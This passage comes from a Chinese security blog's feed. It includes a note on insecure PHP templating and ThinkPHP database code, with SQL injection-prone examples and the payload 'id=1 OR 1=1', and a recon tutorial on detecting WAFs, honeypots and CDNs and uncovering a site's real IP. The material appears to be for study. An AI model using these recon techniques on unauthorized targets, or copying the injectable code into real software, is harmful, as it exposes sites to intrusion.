函数将模板字符串作为PHP代码执行</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span> . <span class="variable">$template</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>file_get_contents</code> 函数读取名为 <code>new.html</code> 的HTML文件，并将文件的内容存储到 <code>$template</code> 变量中。该HTML文件将用作页面的模板，动态替换其中的一些占位符</li><li>通过 <code>mysqli_fetch_row</code> 逐行获取查询结果。此处假设每行的字段按照顺序存储在 <code>$row</code> 数组中。</li><li>使用 <code>str_replace</code> 函数将模板中的占位符替换为从数据库中获取到的数据。</li></ul><p><strong>安全问题</strong>：</p><p>因为后面使用了eval函数将模板字符串作为PHP代码执行，模板字符串基于数据库中提取，如果数据库中的字段存在异常代码，会对其代码执行。</p><blockquote><p>如果在html模板源码中加入<code>&lt;?php phpinfo();?&gt;</code> ，在执行HTML时并不会显示，因为没有以PHP的形式对其执行。</p></blockquote><h2 id="第三方模版引用smarty"><a class="markdownIt-Anchor" href="#第三方模版引用smarty"></a> 第三方模版引用Smarty</h2><ol><li><p><strong>下载</strong>：<a href="https://github.com/smarty-php/smarty/releases">https://github.com/smarty-php/smarty/releases</a></p></li><li><p><strong>使用</strong></p><p>1）创建一个文件夹，命名为smarty-demo<br />2）下载Smarty对应版本并解压缩到该文件夹中。<br />3）创建一个PHP文件，命名为index.php，并在文件中添加以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 引入 Smarty 类文件</span></span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&#x27;smarty-demo/libs/Smarty.class.php&#x27;</span>);</span><br><span class="line">    <span class="comment">// 创建 Smarty 实例</span></span><br><span class="line">    <span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>;</span><br><span class="line">    <span class="comment">// 设置 Smarty 相关属性</span></span><br><span class="line">    <span class="variable">$smarty</span>-&gt;template_dir = <span class="string">&#x27;smarty-demo/templates/&#x27;</span>;</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;compile_dir = <span class="string">&#x27;smarty-demo/templates_c/&#x27;</span>;</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;cache_dir = <span class="string">&#x27;smarty-demo/cache/&#x27;</span>;</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;config_dir = <span class="string">&#x27;smarty-demo/configs/&#x27;</span>;</span><br><span class="line">    <span class="comment">// 赋值变量到模板中</span></span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;欢迎使用 Smarty&#x27;</span>);</span><br><span class="line">    <span class="comment">// 显示模板</span></span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;index.tpl&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4）创建一个名为index.tpl的模板文件，并将以下代码复制到上述点定义文件夹中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;$title&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;$title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个使用 Smarty 的例子。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>安全隐患</strong></p><p>CVE-2017-1000480参考：<a href="https://blog.csdn.net/qq_33020901/article/details/79150260">https://blog.csdn.net/qq_33020901/article/details/79150260</a></p></li></ol><h1 id="tpthinkphp框架"><a class="markdownIt-Anchor" href="#tpthinkphp框架"></a> TP（Thinkphp）框架</h1><p>参考：<a href="https://www.kancloud.cn/manual/thinkphp5_1">ThinkPHP5.1完全开发手册</a></p><h2 id="基本信息"><a class="markdownIt-Anchor" href="#基本信息"></a> 基本信息</h2><ol><li><p><strong>未启用路由情况下的URL访问</strong></p><p>在没有启用路由的情况下，TP框架典型的URL访问规则是：</p><p><code>http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值…]</code></p><p>例如：在application/index/controller下新建cc.php</p><p>访问url：<code>localhost/thinkphp5.1/public/index.php/index/cc/sayhi</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayhi</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="数据库操作-2"><a class="markdownIt-Anchor" href="#数据库操作-2"></a> 数据库操作</h2><p>使用TP框架操作数据库，默认受到框架内置过滤保护</p><ul><li><p>规矩写法：使用 ThinkPHP 提供的 查询构造器（Query Builder）</p><ul><li>相对安全，如果TP版本存在漏洞可能被绕过</li></ul></li><li><p>部分安全写法</p><ul><li>这里使用了 <code>Db::query()</code> 执行 <strong>字符串拼接的 SQL 语句</strong>。</li><li>如果 <code>$id</code> 来自用户输入（未过滤），攻击者可以通过 <code>id=1 OR 1=1</code> 绕过限制，导致 SQL 注入。</li></ul></li><li><p>不安全写法（原生写法）：完全没有使用TP语法</p><ul><li><p>SQL 注入漏洞：攻击者可以构造恶意 SQL 代码（同上 <code>id=1 OR 1=1</code>）。</p><p>不使用 ThinkPHP 的数据库安全机制，直接操作 <code>mysqli_query()</code>，必须手动处理 SQL 安全（如 <code>mysqli_real_escape_string()</code>）。</p></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testsql</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1. 规矩写法</span></span><br><span class="line">    <span class="variable">$id</span>=<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">param</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$data</span>=<span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;news&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;id&#x27;</span>,<span class="variable">$id</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 部分安全写法</span></span><br><span class="line">    <span class="variable">$id</span>=<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">param</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$data</span>=<span class="title class_">Db</span>::<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from news where id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. 纯原生写法</span></span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;select * from news where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">db</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;id&quot;</span>)-&gt;<span class="title function_ invoke__">update</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">    <span class="comment">//return json($data);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文件上传-2"><a class="markdownIt-Anchor" href="#文件上传-2"></a> 文件上传</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 获取表单上传文件，例如上传了001.jpg</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 移动到框架应用根目录/uploads/ 目录下</span></span><br><span class="line">    <span class="variable">$info</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">validate</span>([<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="string">&#x27;jpg,png,gif&#x27;</span>])-&gt;<span class="title function_ invoke__">move</span>(<span class="string">&#x27;../uploads&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$info</span>)&#123;</span><br><span class="line">        <span class="comment">// 成功上传后，获取上传信息</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出文件扩展名，例如 jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getExtension</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出文件保存路径，例如 20160820/42a79759f284b767dfcb2a0197904287.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getSaveName</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出文件名，例如 42a79759f284b767dfcb2a0197904287.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getFilename</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 上传失败，获取错误信息</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="框架版本安全"><a class="markdownIt-Anchor" href="#框架版本安全"></a> 框架版本安全</h2><p>确定目标所使用的Thinkphp版本</p><ul><li>看报错页面</li><li>看THINK_VERSION全局变量</li><li>看url地址构造</li></ul><p>然后通过版本找历史漏洞</p><ul><li><a href="https://github.com/mochazz/thinkphp-vuln?tab=readme-ov-file">https://github.com/mochazz/thinkphp-vuln?tab=readme-ov-file</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『渗透测试』信息收集（二）设备平台</title>
      <link href="/posts/c0ec.html"/>
      <url>/posts/c0ec.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍渗透测试的信息收集阶段中，可能遇到的WAF、蜜罐和CDN这三种设备平台的相关知识</p><h1 id="waf"><a class="markdownIt-Anchor" href="#waf"></a> WAF</h1><h2 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h2><ol><li><p><strong>什么是WAF</strong>：WAF的全称是（Web Application Firewall），即<strong>Web应用防火墙</strong>。WAF是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品，提供web应用层防护安全能力。</p><blockquote><p>WAF只保护web应用，如果目标服务器上还开放了其他的服务，WAF并不会对其进行保护</p></blockquote></li><li><p><strong>原理</strong>：WAF主要是通过<strong>内置的很多安全规则</strong> 来进行防御。</p><ul><li>可防护常见的SQL注入、XSS、网页篡改、中间件漏洞等OWASP TOP10攻击行。</li><li>当发现攻击后，可将IP进行锁定，IP锁定之后将无法访问网站业务。</li><li>也支持防止CC攻击，采用集中度和速率双重检测算法。</li></ul></li><li><p><strong>WAF的分类与其部署方式</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/3ee71cd998dab5d7953eb7d1e5337123.png" alt="3ee71cd998dab5d7953eb7d1e5337123" /></p><p>目前使用非嵌入型WAF比较多，中小型公司使用软件型WAF，zf、jg、学校一般使用硬件型WAF，大型公司使用云WAF（防护能力最强）</p></li></ol><h2 id="waf识别"><a class="markdownIt-Anchor" href="#waf识别"></a> WAF识别</h2><ol><li><p><strong>wafwoof</strong></p><p>kali中执行下面的命令进行WAF扫描（注意是0不是O）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wafw00f ip/域名</span></span><br><span class="line">wafw00f www.isoda.top</span><br></pre></td></tr></table></figure></li><li><p><strong>identYwaf</strong></p><p>地址：<a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></p><p>与wafwoof相比运行速度慢，比较稳定推荐还是使用这一款工具。</p><blockquote><p>这两个工具的原理都是：发送一系列定制的HTTP请求，捕获响应中的特定模式并匹配特征库进行识别（如被拦截的错误页面图片模板）</p></blockquote></li><li><p><strong>网站请求信息中暴露</strong></p><p>网站请求数据包中的 <code>X-Powered-By</code> 字段暴露WAF相关信息</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241224113646275.png" alt="image-20241224113646275" /></p></li><li><p><strong>nmap指纹检测</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -p 80,443 --script=http-waf-detect 目标主机</span></span><br><span class="line">nmap -p 80,443 --script=http-waf-detect www.isoda.top</span><br><span class="line"><span class="comment"># nmap -p 80,443 --script=http-waf-fingerprint 目标主机（精度更高）</span></span><br><span class="line">nmap -p 80,443 --script=http-waf-fingerprint www.isoda.top</span><br></pre></td></tr></table></figure></li></ol><h2 id="识别waf对于安全测试的意义"><a class="markdownIt-Anchor" href="#识别waf对于安全测试的意义"></a> 识别WAF对于安全测试的意义</h2><p>在开始测试之前检测是否存在WAF，如果存在的是软件WAF可以尝试绕过。如果是其他WAF的话大部分都是没办法绕过的，只能考虑从web应用以外的方向攻击，或者直接放弃测试。</p><ul><li>一个网站要是使用了waf，而渗透人员没有识别直接使用工具进行扫描，有可能会导致waf将你的ip地址拉入黑名单而不能访问。</li><li>不同waf可能存在着不同的绕过思路，可以有针对性行的绕过各个厂商的waf。</li></ul><h1 id="蜜罐"><a class="markdownIt-Anchor" href="#蜜罐"></a> 蜜罐</h1><h2 id="基本概念-2"><a class="markdownIt-Anchor" href="#基本概念-2"></a> 基本概念</h2><ol><li><p><strong>什么是蜜罐</strong></p><p>蜜罐（Honeypot）是一种网络安全机制，用于吸引、检测、分析和防御网络攻击。它通常被设计成一个看似真实但实际上是受控的系统或环境，诱使攻击者对其进行攻击，从而保护真正的系统并收集有关攻击行为的信息。</p></li><li><p><strong>蜜罐在红蓝对抗中扮演的角色</strong></p><ul><li>红队：通过<mark>识别蜜罐</mark>来发现和规避蜜罐</li><li>蓝队：<mark>部署蜜罐</mark>来保护真正的系统，通过分析蜜罐的被攻击记录推测攻击者的意图和攻击手法等信息</li></ul></li><li><p><strong>蜜罐的分类</strong></p><p>1）根据蜜罐与攻击者之间进行的交互的程度分类</p><ul><li>低交互蜜罐</li><li>中交互蜜罐</li><li>高交互蜜罐</li></ul><p>2）根据蜜罐模拟的目标分类</p><ul><li>数据库蜜罐</li><li>工控蜜罐：模拟ICS设备，如SCADA、PLC</li><li>物联网蜜罐：模拟IOT设备，如路由器、智能摄像头</li><li>Web蜜罐</li><li>…</li></ul></li><li><p><strong>开源蜜罐项目</strong></p><ul><li><a href="https://hfish.net/#/">https://hfish.net/#/</a></li></ul></li></ol><h2 id="蜜罐识别"><a class="markdownIt-Anchor" href="#蜜罐识别"></a> 蜜罐识别</h2><ol><li><p><strong>蜜罐识别技术的原理</strong></p><p><a href="https://mp.weixin.qq.com/s/jPz9hBmUypFyQlU27vglUg">谁是鱼谁是饵？红队视角下蜜罐识别方式汇总</a></p></li><li><p><strong>人工分析方法</strong></p><p>人工审查目标服务器IP，如果是蜜罐的话可能存在以下的特征：</p><p><strong>1）端口多而有规律性</strong>：蜜罐通常开放多个端口，以模拟真实服务器的服务。这些端口可能包括常见的 HTTP、SSH、MySQL 等服务端口。可能开放多个端口运行http服务，端口号连续且比较大。</p><p><strong>2）蜜罐设计导致真实应用解析问题</strong>：例如目标服务器存在开放端口3306（ 一般运行MySQL服务）</p><ul><li><p>如果这个服务器不是蜜罐：如果你在浏览器中访问 <code>http://目标IP:3306</code>，通常会提示“连接被拒绝”或“无法建立连接”。因为 MySQL 是基于特定数据库协议的，而浏览器主要支持 HTTP/HTTPS 协议，因此MySQL 服务器并不支持 HTTP，从而拒绝连接。</p></li><li><p>如果这个服务器是蜜罐：如果你在浏览器中访问 <code>http://目标IP:3306</code>，通常不是返回常见的 HTML 页面，而是立即提示或开始下载JSON或HTML文件。</p><p>蜜罐会捕获攻击者尝试暴力破解 SSH、MySQL 等服务的用户名和密码，记录的账号密码通过 Web 功能（如 JSONP）传输到蜜罐运维方的实时监控后台。因为这里使用到了jsonp等web功能，浏览器访问的时候就会使用web协议来解析，从而导致了下载（蜜罐的设计理念所导致的问题）。</p></li></ul><blockquote><p>参考：</p><ul><li><a href="https://blog.csdn.net/qq_42746827/article/details/109652508">基于Hfish的蜜罐分析和JSONP利用</a></li><li><a href="https://www.freebuf.com/articles/network/373478.html">攻防演练之蜜罐获取个人信息方式研究</a></li></ul><p>假设百度某个接口存在jsonp漏洞，防守方可在web蜜罐页面上，加载一个js，由于js请求可跨域，即可向存在jsonp漏洞的 <code>xx.baidu.com/xx</code> 发请求。此时如果访问者存在 <code>baidu.com</code> 的登录态，那么这个请求是能自动带上 <code>baidu.com</code> 的 cookie 的，响应中会有回调函数以及json格式封装的数据。</p></blockquote><p><strong>3）蜜罐设备指纹分析</strong></p><p>记录维护常见的蜜罐设备指纹信息</p></li><li><p><strong>工具</strong></p><ul><li><p>Heimdallr：chrome浏览器插件</p></li><li><p><a href="https://github.com/360quake/quake_rs">https://github.com/360quake/quake_rs</a> 需要会员</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quake.exe honeypot 目标IP</span><br></pre></td></tr></table></figure></li></ul></li></ol><h1 id="cdn"><a class="markdownIt-Anchor" href="#cdn"></a> CDN</h1><h2 id="基本概念-3"><a class="markdownIt-Anchor" href="#基本概念-3"></a> 基本概念</h2><ol><li><p><strong>原理</strong></p><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/u6pjybbkxn.png" alt="img" /></p></li><li><p><strong>CDN对于安全测试有那些影响?</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.传统访问：用户访问域名–&gt;解析服务器IP–&gt;访问目标主机</span><br><span class="line">2.普通CDN：用户访问域名–&gt;CDN节点–&gt;真实服务器IP–&gt;访问目标主机</span><br><span class="line">3.带WAF的CDN：用户访问域名–&gt;CDN节点（WAF）–&gt;真实服务器IP–&gt;访问目标主机</span><br></pre></td></tr></table></figure><ul><li>CDN会隐藏服务器真实的ip地址，<mark>无法对目标网站的操作系统进行渗透</mark></li><li>但CDN站点又可以理解为是目标站点的镜像站点（大多数都是静态CDN加速），拥有相同的网站架构，且CDN服务器可与站点服务器进行交互，因此<mark>sql注入，xss等漏洞的挖掘并不受太大影响</mark>。</li></ul></li><li><p><strong>常见的CDN服务提供商</strong></p><p>1）国内：阿里云 百度云 七牛云 又拍云 腾讯云 Ucloud 360 网宿科技 ChinaCache</p><p>2）国外：CloudFlare StackPath Fastly Akamai CloudFront Edgecast CDNetworks Google Cloud CDN CacheFly Keycdn Udomain CDN77</p></li></ol><h2 id="如何判断目标存在cdn服务"><a class="markdownIt-Anchor" href="#如何判断目标存在cdn服务"></a> 如何判断目标存在CDN服务?</h2><ol><li><p><strong>多节点请求技术</strong></p><p>如果ping的结果只有一个那么就没有CDN、要是不止一个则可以判断为有CDN</p><ul><li><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p></li><li><p><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p></li><li><p><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p></li></ul></li><li><p><strong>nslookup查询域名解析信息</strong></p><p>如果查询结果中adress存在不止一个，表示使用了CDN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure></li></ol><h2 id="cdn绕过"><a class="markdownIt-Anchor" href="#cdn绕过"></a> CDN绕过</h2><h3 id="子域名查询"><a class="markdownIt-Anchor" href="#子域名查询"></a> <strong>子域名查询</strong></h3><ol><li><p><strong>原理</strong></p><p>假设存在主站 www.isoda.top（192.168.1.100） 和子站 bbs.isoda.top ，两个网站可能存在三种关系：</p><ul><li><p>子站ip也是 192.168.1.100：由同一台服务器托管，或使用了同一个CDN</p></li><li><p>子站ip在同一个网段上，ip为192.168.1.1-254：处于同一数据中心或服务提供商的机房中，或者是运行在同一局域网内的不同服务器上</p></li><li><p>子站ip在不同网段上：没有关系，一般不考虑</p></li></ul><p>一般主站的流量要比子站大得多，所以很多站长只会对主站或者流量大的子站点做CDN服务。在这种情况下，可以通过子站的真实IP推算出主站的真实IP（和子站在同一台服务器或者同一个C段）。</p></li><li><p><strong>方法</strong></p><p><strong>1）获取子域名</strong></p><ul><li><p>子域名扫描器</p><ul><li>layer：基于字典进行挖掘</li></ul></li><li><p>谷歌语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看www以外的子域名</span><br><span class="line">site:baidu.com -www</span><br></pre></td></tr></table></figure></li></ul><p><strong>2）使用进行超级ping工具进行多节点ping，找没有用cdn解析的子站点</strong></p><p>工具： <a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><ul><li><p><strong>ping 带 <code>www</code> 和不带 <code>www</code> 的网站主站域名</strong></p><p>大部分网站会将带 <code>www</code> 和不带 <code>www</code> 的请求指向同一台服务器，保证两者的内容一致。但如果网站使用了 CDN 或缓存服务，而带 <code>www</code> 和不带 <code>www</code> 的域名使用了不同的解析策略，请求可能有一个指向CDN，而另一个指向的是真实IP。</p><blockquote><p>例如这里可以看到，我们是可以对 <code>www</code> 和 <code>*</code> 的访问进行分别配置的</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241223111420660.png" alt="image-20241223111420660" /></p></blockquote></li><li><p><strong>ping 主站的手机端域名</strong></p><p>一般是在域名前加上 <code>m.</code> ，可以访问网站对应的客户端版本</p></li></ul></li></ol><h3 id="邮件服务查询"><a class="markdownIt-Anchor" href="#邮件服务查询"></a> 邮件服务查询</h3><ol><li><p><strong>原理</strong></p><p>一般的中大型网站都会存在邮件服务，这种服务一般都是只有内部员工访问，所以并不会使用CDN。</p></li><li><p><strong>方法</strong></p><p>我们可以尝试让网站向我们发送邮件（利用注册账号、找回密码等接口，让网站向我们的邮箱发送验证码），然后通过<strong>邮箱反查技术</strong>获取到邮件服务器的真实IP信息，邮件服务器的真实IP一般与网站IP相同或处于同一个网段。</p><ul><li><p>直接查看邮件源代码（gmail、outlook可用），里面存在网站真实IP</p><p><a href="https://docs.pingcode.com/baike/3355565">怎么查看邮件源代码</a></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241223155741496.png" alt="image-20241223155741496" /></p></li></ul></li><li><p><strong>常见的邮件触发点</strong></p><ul><li>RSS订阅</li><li>邮箱注册、激活处</li><li><strong>邮箱找回密码处</strong></li><li>产品更新的邮件推送</li><li>某业务执行后发送的邮件通知</li><li>员工邮箱、邮件管理平台等入口处的忘记密码</li></ul></li></ol><h3 id="国外地址请求"><a class="markdownIt-Anchor" href="#国外地址请求"></a> 国外地址请求</h3><ol><li><p><strong>原理</strong>：国内的服务器为了节省成本，一般不会部署CDN到国外的运营商。</p></li><li><p><strong>方法</strong>：在这种情况下，通过国外的代理直接访问网站可能可以直接获取到真实IP。</p><p>但是有些比较大或离中国比较近的国家（美国、加拿大、日本等）还是可能会部署CDN，所以尽量找比较冷门的国家。</p></li><li><p><strong>工具</strong></p><ul><li><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li></ul></li></ol><h3 id="全网扫描"><a class="markdownIt-Anchor" href="#全网扫描"></a> 全网扫描</h3><ol><li><p><strong>原理</strong></p><p>基于网站所使用CDN厂商，去IP库中查询</p><p><mark>准确率低、麻烦、时间成本大，属于没有办法的办法</mark></p></li><li><p><strong>方法</strong></p><p><strong>1）判断目标网站使用的CDN服务提供商</strong></p><p>工具：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><p><strong>2）IP库筛选地址段</strong></p><p>基于CDN服务提供商，在IP库中查询该服务提供商的真实IP地址范围</p><p>工具：纯真IP库 <a href="https://github.com/FW27623/qqwry">https://github.com/FW27623/qqwry</a></p><p><strong>3）配置范围扫描</strong></p><p>基于目标网站的一些特征（如网站的标题），扫描获取到的IP地址范围，看是否存在匹配的网站</p><p>工具：</p><ul><li>fuckcdn <a 